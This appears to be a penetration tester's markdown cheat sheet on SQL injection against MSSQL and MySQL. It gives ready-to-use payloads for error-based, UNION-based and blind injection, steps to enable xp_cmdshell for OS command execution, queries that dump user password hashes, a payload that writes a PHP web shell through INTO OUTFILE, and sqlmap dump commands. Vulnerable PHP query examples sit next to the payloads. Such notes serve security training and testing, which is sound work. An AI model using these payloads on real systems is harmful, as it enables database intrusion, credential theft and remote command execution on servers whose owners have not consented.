# SQLi

## MSSQL 

### Basics

#### Connection

User account: `Administrator`
```
kali$ impacket-mssqlclient $SomeUserAccount:$somepass@$TargetIp -windows-auth
```

#### Commands

Known table `master.sys.sysusers`: https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysusers-transact-sql?view=sql-server-ver16
```
SQL> SELECT @@version;
SQL> SELECT name FROM sys.databases;
SQL> SELECT * FROM somedatabasename.information_schema.tables; # tables of the "somedatabasename" db, together with their schema
SQL> SELECT * FROM somedatabasename.someschema.sometablename; # table name of interest: "users"

SQL> select * from master.information_schema.tables;
SQL> select top 2 * from master.dbo.sysusers; # table "sysusers" is an alias /!\; top 2 lines

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```

## MySQL

### Basics

#### Connection
```
$ mysql -u root -p'rootpassword' -h $DbServerIp -P $DbServerPort
```

#### Commands
```
> select version();
> select system_user();
> show databases;
> use databasetohack;
> select table_name from information_schema.tables;
> select table_name, table_schema from information_schema.tables where table_schema = 'databasetohack';
> select table_name, table_schema from information_schema.tables where table_schema = database(); # current db in use
> select column_name from information_schema.columns where table_name = 'tablenamewithusers' ;

> SELECT user, authentication_string, plugin FROM mysql.user WHERE user = 'usertohack';
```

### Attacks

#### Error-based payloads

Php mysqli queries (stands for MySQL Improved): https://www.php.net/manual/en/mysqli.query.php

Vulnerable Php query:
```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

Injections:
```
someuser ' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' or 1=1 in (select version()) -- //
' or 1=1 in (select * from user_table) -- //
' or 1=1 in (select password_column from user_table) -- //
' or 1=1 in (select password_column from user_table where username_column = 'admin') -- //
```

#### Union select

Regular `UNION SELECT`: https://www.mysqltutorial.org/sql-union-mysql.aspx

Vulnerable Php query:
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

Injection:
```
' order by 1,2,3 -- //
%' union select database(), user(), @@version, null, null -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' union select null, username, password, description, null from users -- //
```
gives:
```
SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
SELECT * from customers WHERE name LIKE '%' union select database(), user(), @@version, null, null -- //'";
SELECT * from customers WHERE name LIKE '' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
The `order by` injection retrieves the table size.

#### Blind injections

Boolean-based, the fake user query gives an empty output:
```
http://$TargetIp/blindsqli.php?user=trueuser' AND 1=1 -- //
http://$TargetIp/blindsqli.php?user=fakeuser' AND 1=1 -- //
```

Time-based, the fake user response is immediate (time consuming):
```
http://$TargetIp/blindsqli.php?user=trueuser' AND IF (1=1, sleep(3),'false') -- //
http://$TargetIp/blindsqli.php?user=fakeuser' AND IF (1=1, sleep(3),'false') -- //
```

#### Php injection

Php injection in an `input` HTML field:
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/on/target/webshell.php" -- //
```
and trigger the webshell:
```
curl $TargetIp/path/on/target/webshell.php?cmd=ls
```

## Sqlmap

https://sqlmap.org/
 
```
sqlmap -u http://ip/page.php?user=dummy -p user
sqlmap -u http://ip/page.php?user=dummy -p user --dump
```


